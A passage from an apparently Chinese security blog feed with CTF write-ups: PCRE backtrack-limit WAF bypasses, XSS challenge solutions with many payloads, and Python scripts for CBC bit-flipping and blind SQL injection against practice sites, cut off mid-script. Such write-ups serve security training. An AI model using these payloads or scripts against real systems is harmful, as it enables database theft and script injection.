    <link href="http://yoursite.com/2019/09/07/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://yoursite.com/2019/09/07/PHP利用PCRE回溯绕过正则表达式/</id>
    <published>2019-09-07T08:58:40.000Z</published>
    <updated>2019-09-07T08:58:40.343Z</updated>
    
    <content type="html"><![CDATA[<h2 id="正则匹配过程"><a href="#正则匹配过程" class="headerlink" title="正则匹配过程"></a>正则匹配过程</h2><p>PHP正则利用的是NFA（非确定性有限自动机）。<br>遇到<code>.*</code>或者<code>.+</code>：直接匹配字符串末尾，然后一个个回溯，与之后的模式比较<br>遇到<code>.*?</code>或者<code>.+?</code>：非贪婪模式，在匹配到符合的字符串，停止，由下一个模式匹配，下一个模式不符合，回溯，再有<code>.*?</code>匹配，直到下一个模式符合</p><h2 id="preg-match函数问题"><a href="#preg-match函数问题" class="headerlink" title="preg_match函数问题"></a>preg_match函数问题</h2><p>PHP为了防止拒绝服务攻击，设置了回溯上限次数为1000000，当回溯次数超过上限，preg_match函数会返回false，因此绕过waf</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>1.sql的waf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&apos;/UNION.+?SELECT/is&apos;, $input)) &#123;</span><br><span class="line">die(&apos;SQL Injection&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>非贪婪模式，可以用<code>/*aaa*/</code>绕过，poc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$input = &quot;select * from users where id=-1 union/*&quot; . str_repeat(&apos;a&apos;, 1000000) . &quot;*/select 1,2,3&quot;;</span><br></pre></td></tr></table></figure></p><p>2.php的waf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function is_php($data)&#123;  </span><br><span class="line">    return preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以在注释后添加n个a绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$input = &quot;&lt;?php phpinfo();//&quot; + str+repeat(&apos;a&apos;,1000000)</span><br></pre></td></tr></table></figure></p><ol><li>Nu1lCTF绕过<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&apos;/sleep|BENCHMARK|GET_LOCK|information_schema|into.+?outfile|into.+?dumpfile|\/\*.*\*\//is&apos;, $input)) &#123;</span><br><span class="line">die(&apos;Go out!!!&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$input = &quot;select * from users into/*&quot; . str_repeat(&quot;a&quot;, 1000000) . &quot;*/outfile &apos;D://2.txt&apos;&quot;;</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>三个关键点：preg_match，<code>*</code>或者<code>+</code>，注释绕过<br>当碰到这三个点，有很大机会可以绕过正则过滤</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;正则匹配过程&quot;&gt;&lt;a href=&quot;#正则匹配过程&quot; class=&quot;headerlink&quot; title=&quot;正则匹配过程&quot;&gt;&lt;/a&gt;正则匹配过程&lt;/h2&gt;&lt;p&gt;PHP正则利用的是NFA（非确定性有限自动机）。&lt;br&gt;遇到&lt;code&gt;.*&lt;/code&gt;或者&lt;code&gt;.
      
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>alert(1) to win wp</title>
    <link href="http://yoursite.com/2019/09/05/alert(1)%20to%20win%20wp/"/>
    <id>http://yoursite.com/2019/09/05/alert(1) to win wp/</id>
    <published>2019-09-05T12:46:46.000Z</published>
    <updated>2019-09-05T12:46:46.847Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Warmup："><a href="#1-Warmup：" class="headerlink" title="1.Warmup："></a>1.Warmup：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos;+s+&apos;&quot;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将用户输入字符串放入<code>console.log</code>中，可以通过闭合括号和注释，输出alert<br><code>&quot;);alert(1)//</code><br><a href="https://www.runoob.com/js/js-regexp.html" target="_blank" rel="noopener">js正则表达式</a></p><h2 id="2-Adobe："><a href="#2-Adobe：" class="headerlink" title="2.Adobe："></a>2.Adobe：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = s.replace(/&quot;/g, &apos;\\&quot;&apos;);</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了<code>&quot;</code>，通过<code>&lt;script&gt;</code>标签闭合<br>js的正则通过<code>//</code>斜杠包裹<br><code>&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></p><h2 id="3-JSON："><a href="#3-JSON：" class="headerlink" title="3.JSON："></a>3.JSON：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = JSON.stringify(s);</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JSON.stringfy函数，意思是将输入的数组或者对象转换为JSON字符串，也可以是字符串，会做相应的过滤<br><a href="https://www.runoob.com/js/js-json.html" target="_blank" rel="noopener">JSON</a><br>上一关payload可以通关<br><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h2 id="4-Markdown"><a href="#4-Markdown" class="headerlink" title="4.Markdown"></a>4.Markdown</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var text = s.replace(/&lt;/g, &apos;&amp;lt;&apos;).replace(/&quot;/g, &apos;&amp;quot;&apos;);</span><br><span class="line">  // URLs</span><br><span class="line">  text = text.replace(/(http:\/\/\S+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;);</span><br><span class="line">  // [[img123|Description]]</span><br><span class="line">  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, &apos;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&apos;);</span><br><span class="line">  return text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload1：<code>http://[[sb|/onclick=alert(1)&gt;]]</code><br>但不能通过<br>payload2：<code>[[t|http://onerror=alert(1)//]]</code></p><p>思路：payload1思路，外层为a标签，中间引入img标签可以闭合第一个href的双引号，使得我们可以逃逸字符串来控制标签中的内容，插入<code>&gt;</code>闭合a标签，从而触发xss。<br>payload2思路，外层为img标签，中间同样引入a标签闭合alt的双引号，标签中有其他字符串没关系，会被当成标签中没有的属性处理，on事件后有双引号，可以用<code>//</code>杀掉，从而触发xss。</p><p>总结：<br>标签中<code>/</code>：可以替换空格，隔开属性<br><code>//</code>：可以用来杀掉后面的双引号<br>标签不存在的英文，可以不用理会</p><h2 id="5-DOM"><a href="#5-DOM" class="headerlink" title="5.DOM"></a>5.DOM</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  // Slightly too lazy to make two input fields.</span><br><span class="line">  // Pass in something like &quot;TextNode#foo&quot;</span><br><span class="line">  var m = s.split(/#/);</span><br><span class="line"></span><br><span class="line">  // Only slightly contrived at this point.</span><br><span class="line">  var a = document.createElement(&apos;div&apos;);</span><br><span class="line">  a.appendChild(document[&apos;create&apos;+m[0]].apply(document, m.slice(1)));</span><br><span class="line">  return a.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户可以任意添加子节点，text节点因为转义无法执行代码，属性节点语法错误不能添加，元素节点只能添加元素无法利用，添加注释节点，通过闭合标签，可以逃出注释执行代码<br><code>Comment#--&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br><a href="https://www.runoob.com/w3cnote/js-call-apply-bind.html" target="_blank" rel="noopener">js apply用法</a></p><h2 id="6-Callback"><a href="#6-Callback" class="headerlink" title="6.Callback"></a>6.Callback</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  // Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing = s.split(/#/); </span><br><span class="line"></span><br><span class="line">  if (!/^[a-zA-Z\[\]&apos;]*$/.test(thing[0])) return &apos;Invalid callback&apos;;</span><br><span class="line">  var obj = &#123;&apos;userdata&apos;: thing[1] &#125;;</span><br><span class="line">  var json = JSON.stringify(obj).replace(/&lt;/g, &apos;\\u003c&apos;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前后两个字符串都没有过滤单引号，可以用单引号包裹，可以逃出json字符串，后面双引号用<code>//</code>杀掉，从而执行代码。<br><code>&#39;#&#39;;alert(1)//</code></p><h2 id="7-Skandia"><a href="#7-Skandia" class="headerlink" title="7.Skandia"></a>7.Skandia</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将字符串转换为大写，直接alert是无法执行的，js函数是区分大小写的，那么可以把思路转换成通过标签，通过HTML实体编码来绕过，标签中的js代码可以通过实体编码绕过！<br><code>&lt;/script&gt;&lt;img src=1 onerror=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;</code><br>简单写了个转换脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = &apos;alert&apos;</span><br><span class="line">for i in s:</span><br><span class="line">print(&apos;&amp;#&apos;+str(ord(i)),end=&quot;&quot;)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-Warmup：&quot;&gt;&lt;a href=&quot;#1-Warmup：&quot; class=&quot;headerlink&quot; title=&quot;1.Warmup：&quot;&gt;&lt;/a&gt;1.Warmup：&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>XSS挑战write up</title>
    <link href="http://yoursite.com/2019/09/05/XSS%E6%8C%91%E6%88%98write%20up/"/>
    <id>http://yoursite.com/2019/09/05/XSS挑战write up/</id>
    <published>2019-09-05T12:45:43.000Z</published>
    <updated>2019-09-05T12:45:43.592Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、DVWA"><a href="#一、DVWA" class="headerlink" title="一、DVWA"></a>一、DVWA</h2><h3 id="1-DOM"><a href="#1-DOM" class="headerlink" title="1.DOM"></a>1.DOM</h3><p>low：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br>medium：<code>&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code><br>注意有的要包裹前面的<br>high：<code>English#&lt;script&gt;alert(1)&lt;/script&gt;</code><br>服务器端过滤的是GET的参数，而前端js使用的是整个url，可以通过#隔开插入js语句</p><h3 id="2-stored和reflect"><a href="#2-stored和reflect" class="headerlink" title="2.stored和reflect"></a>2.stored和reflect</h3><p><code>&lt;img src=1 onerror=alert(1)&gt;</code>通关所有</p><h2 id="二、XSS挑战"><a href="#二、XSS挑战" class="headerlink" title="二、XSS挑战"></a>二、XSS挑战</h2><p>level1：<code>http://xss.tesla-space.com/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</code><br>test字符串在外部</p><p>level2：<code>http://xss.tesla-space.com/level1.php?name=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br>test字符串在属性中</p><p>level3：<code>http://xss.tesla-space.com/level3.php?keyword=&#39; onclick=&#39;alert(1)</code><br>尖括号，双引号都被过滤了，单引号没被过滤，尝试通过单引号闭合并尝试</p><p>level4：<code>http://xss.tesla-space.com/level4.php?keyword=&quot; onclick=&quot;alert(1)</code><br>与level3类似，只是单引号变双引号</p><p>level5：<code>http://xss.tesla-space.com/level5.php?keyword=&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;</code><br>过滤了on和srcipt，可以通过javascript伪协议弹窗，a的href属性或者iframe的src属性都可以</p><p>level6：<code>http://xss.tesla-space.com/level6.php?keyword=&quot; oNclick=&quot;alert(1)</code><br>大小写绕过对ON的过滤</p><p>level7：<code>http://xss.tesla-space.com/level7.php?keyword=&quot; oonnclick=&quot;alert(1)</code><br>叠加绕过对on的过滤</p><p>level8：<code>http://xss.tesla-space.com/level8.php?keyword=javascrip%26%23x74%3B%3Aalert%28%2fxss%2f%29</code><br>test值出现在a的src属性中，可以通过伪js代码进行xss，过滤了javascript字符串<br>因为是在属性当中，所以可以通过实体编码绕过，如<code>javascrip&amp;#116;:alert(/xss/)</code>在url传输中需要进行url编码<br><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">编码网站</a></p><p>level9：<code>http://xss.tesla-space.com/level9.php?keyword=javascrip%26%23116%3Aalert%281%29%2f%2fhttp%3A%2f%2fwww.baidu.com</code><br>与level8类似，多了正则匹配http正确网址，在后面加个<code>//</code>和网址就可以绕过</p><p>level10：<code>http://xss.tesla-space.com/level10.php?keyword=sb&amp;t_link=http://www.baidu.comt&amp;t_history=666&amp;t_sort=&quot; onmouseover=&quot;alert(1)&quot; type=&quot;button</code><br>hidden属性中的xss注入，hidden中的值也要测试，可能过滤不严也会出现xss</p><p>level11：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>referrer属性的值在html中出现，并且过滤不严</p><p>level12：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>与11类似，将数据包中的user-agent放在input属性中。</p><p>level13：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>与11类似，将cookie中的值放在input属性中</p><p>level14：chrome组件exif xss，有点问题没做出来<br>level15：<code>http://xss.tesla-space.com/level15.php?src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;</code><br>angular js的一点知识，ng-include有包含文件的意思，相当于php的include<br>奇怪的是，我直接访问没法包含，前进后退才成功包含，我也不清楚原因，可以包含同域的第一关页面的xss成功反弹</p><p>level16：<code>http://xss.tesla-space.com/level16.php?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;</code><br>过滤了空格和script，可以用img标签，然后用%0a绕过空格</p><p>level17：<code>http://xss.tesla-space.com/level17.php?arg01=.php/sbasdf/wqer/asdf&amp;arg02= onclick=alert(1) style=display:block;height:500px;width:500px;background:blue;</code><br>也是属性内的xss，但是标签显示不出来，插入style属性，将标签转换为block就能点击</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、DVWA&quot;&gt;&lt;a href=&quot;#一、DVWA&quot; class=&quot;headerlink&quot; title=&quot;一、DVWA&quot;&gt;&lt;/a&gt;一、DVWA&lt;/h2&gt;&lt;h3 id=&quot;1-DOM&quot;&gt;&lt;a href=&quot;#1-DOM&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>实验吧web wp</title>
    <link href="http://yoursite.com/2019/09/05/%E5%AE%9E%E9%AA%8C%E5%90%A7web%20wp/"/>
    <id>http://yoursite.com/2019/09/05/实验吧web wp/</id>
    <published>2019-09-05T11:52:47.000Z</published>
    <updated>2019-09-05T11:52:47.763Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-简单登录题"><a href="#1-简单登录题" class="headerlink" title="1. 简单登录题"></a>1. 简单登录题</h2><p>考点：CBC翻转字节攻击+sql注入<br>从返回包得到tip：test.php<br>访问得到源码<br>阅读源码，接收id，对id进行过滤，然后将id分配到数组进行序列化加密，把加密后的id数据和iv进行base64编码发送给用户，用户通过加密的id和iv访问页面，后台对id进行解密，无法序列化返回plaintext，能够序列化不检查直接拼接到sql语句库进行查询</p><p>解法：<br>sql注入：limit后的sql注入，可以通过拼接union进行查询，过滤了<code>=</code>，可以用regexp进行绕过，过滤了<code>,</code>，过滤了union，通过cbc进行绕过<br>cbc翻转：解密是从后往前，第一次请求输入2nion，明文为2，可以进行修改，为u进行绕过，但是修改了前一段密文，需要第二次请求，修改iv，将第一段密文修改为可以序列化的字符串。</p><p>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding:utf-8 -*-</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">payload = &quot;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&quot; + chr(0)</span><br><span class="line">payload = &quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join (select 3)c);&quot;+chr(0)</span><br><span class="line">offset = 6 if len(payload)&lt;100 else 7</span><br><span class="line">url = &quot;http://ctf5.shiyanbar.com/web/jiandan/index.php&quot;</span><br><span class="line">data = &#123;&apos;id&apos;:payload&#125;</span><br><span class="line"></span><br><span class="line">headers = requests.post(url,data=data).headers[&apos;Set-Cookie&apos;]</span><br><span class="line">headers = urllib.parse.unquote(headers)</span><br><span class="line">iv_pattern = re.compile(r&apos;iv=(.+),&apos;)</span><br><span class="line">cipher_pattern = re.compile(r&apos;cipher=(.+)&apos;)</span><br><span class="line">iv = re.findall(iv_pattern,headers)[0]</span><br><span class="line">iv_row = base64.b64decode(iv)</span><br><span class="line">cipher = base64.b64decode(re.findall(cipher_pattern,headers)[0])</span><br><span class="line"></span><br><span class="line">bin_cipher = bytearray(cipher)</span><br><span class="line">bin_cipher[offset] = bin_cipher[offset] ^ ord(&apos;2&apos;) ^ ord(&apos;u&apos;)</span><br><span class="line">cipher_new = urllib.parse.quote(base64.b64encode(bytes(bin_cipher)))</span><br><span class="line">cookies = &#123;</span><br><span class="line">&quot;iv&quot;:iv,</span><br><span class="line">&quot;cipher&quot;:cipher_new</span><br><span class="line">&#125;</span><br><span class="line">html = requests.get(url,cookies=cookies).text</span><br><span class="line"></span><br><span class="line">wrong = base64.b64decode(re.findall(r&apos;\(\&apos;(.*)\&apos;\)&apos;,html)[0])</span><br><span class="line">iv_new = &apos;&apos;</span><br><span class="line">plaintext = &quot;a:1:&#123;s:2:\&quot;id\&quot;;s:&quot;</span><br><span class="line"></span><br><span class="line">bin_iv = bytearray(iv_row)</span><br><span class="line">for i in range(len(plaintext)):</span><br><span class="line">bin_iv[i] = bin_iv[i] ^ wrong[i] ^ ord(plaintext[i])</span><br><span class="line"></span><br><span class="line">iv_new = urllib.parse.quote(base64.b64encode(bytes(bin_iv)))</span><br><span class="line">cookies = &#123;</span><br><span class="line">&quot;iv&quot; : iv_new,</span><br><span class="line">&quot;cipher&quot; : cipher_new</span><br><span class="line">&#125;</span><br><span class="line">result = requests.get(url,cookies = cookies).text</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure></p><h2 id="2-认真一点"><a href="#2-认真一点" class="headerlink" title="2. 认真一点"></a>2. 认真一点</h2><p>考点：SQL盲注<br>sql语句的弱类型：<br>select <em> from users where id=’1’ 与<br>select </em> from users where id=’1kage’能返回一样的值<br>用burp爆破，waf没有过滤了or，单引号，可以进行盲注<br>过滤了<code>^</code>可以用<code>$</code>从后面进行盲注<br>len被过滤，可以用<code>length</code>进行代替<br>python中post传输数据%xx要用0x来代替</p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def my_replace(s):</span><br><span class="line">return s.replace(&apos; &apos;,chr(0x0a)).replace(&apos;or&apos;,&apos;oorr&apos;)</span><br><span class="line"></span><br><span class="line">url = r&apos;http://ctf5.shiyanbar.com/web/earnest/index.php&apos;</span><br><span class="line"># 0&apos; or 1 or &apos;kage&apos;=&apos;</span><br><span class="line">True_state = &apos;You are in&apos;</span><br><span class="line">model = &quot;0&apos; or %s or &apos;kage&apos;=&apos;&quot;</span><br><span class="line">column = &quot;database()&quot;</span><br><span class="line"></span><br><span class="line"># column = database()</span><br><span class="line">def my_length(column):</span><br><span class="line">model_len = &quot;(select length(%s)=%%d)&quot; % column</span><br><span class="line">t = 1</span><br><span class="line">while True:</span><br><span class="line">payload_len = model_len % t</span><br><span class="line">payload = my_replace(model % payload_len)</span><br><span class="line">data = &#123;&apos;id&apos;:payload&#125;</span><br><span class="line">html = requests.post(url,data=data).text</span><br><span class="line">if True_state in html:</span><br><span class="line">print(&quot;[+]length(%s): %d&quot; % (column,t))</span><br><span class="line">return t</span><br><span class="line">t += 1</span><br><span class="line"></span><br><span class="line"># column = database()</span><br><span class="line">def my_data(column,len):</span><br><span class="line">model_data = &quot;(select %s regexp &apos;%%s$&apos;)&quot; % column</span><br><span class="line">cset = string.digits+string.ascii_lowercase+&apos;!_&#123;&#125;@~.&apos;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(len):</span><br><span class="line">for c in cset:</span><br><span class="line">payload_data = model_data % (c + result)</span><br><span class="line">payload = my_replace(model % payload_data)</span><br><span class="line">data = &#123;&apos;id&apos;:payload&#125;</span><br><span class="line">html = requests.post(url,data=data).text</span><br><span class="line">if True_state in html:</span><br><span class="line">result = c + result</span><br><span class="line">print(result)</span><br><span class="line">break</span><br><span class="line">pass</span><br><span class="line">print(&quot;[+]column: %s&quot; % result)</span><br><span class="line"></span><br><span class="line">def get_data(column):</span><br><span class="line">return my_data(column,my_length(column))</span><br><span class="line"></span><br><span class="line"># get_data(&quot;database()&quot;)</span><br><span class="line"># get_data(&quot;(select group_concat(table_name separator &apos;@&apos;) from information_schema.tables where table_schema=database() limit 1)&quot;)</span><br><span class="line"># get_data(&quot;(select group_concat(column_name separator &apos;@&apos;) from information_schema.columns where table_name=&apos;fiag&apos; limit 1)&quot;)</span><br><span class="line">get_data(&quot;(select fl$4g from fiag limit 1)&quot;)</span><br></pre></td></tr></table></figure><h2 id="3-后台登录"><a href="#3-后台登录" class="headerlink" title="3. 后台登录"></a>3. 后台登录</h2><p>考点：MD5弱类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$password=$_POST[&apos;password&apos;];</span><br><span class="line">    $sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&quot;.md5($password,true).&quot;&apos;&quot;;</span><br><span class="line">    $result=mysqli_query($link,$sql);</span><br><span class="line">        if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">            echo &apos;flag is :&apos;.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &apos;密码错误!&apos;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>md5函数，第二个参数为true会将16进制字符串解析成字符串从而形成注入<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line">string: T0Do#&apos;or&apos;8</span><br><span class="line"></span><br><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">string: &apos;or&apos;6]!r,b</span><br></pre></td></tr></table></figure></p><p><img src="/img/1566054085195.png" alt=""></p><h2 id="5-加了料的报错注入"><a href="#5-加了料的报错注入" class="headerlink" title="5. 加了料的报错注入"></a>5. 加了料的报错注入</h2><p>考点：sql盲注</p><h3 id="（1）布尔盲注解题"><a href="#（1）布尔盲注解题" class="headerlink" title="（1）布尔盲注解题"></a>（1）布尔盲注解题</h3><p>查看源码，给了我们后台sql语句<br><code>$sql=&quot;select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code><br>我最初尝试通过布尔盲注进行解题，因为是post类型，不断尝试用or进行登录，最终成功登录，写脚本布尔盲注。因为过滤了<code>=</code>,我通过<code>regexp &#39;^$&#39;</code>进行绕过，过滤了<code>limit</code>可以使用<code>group_concat</code>。<br>脚本（改自第三题）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 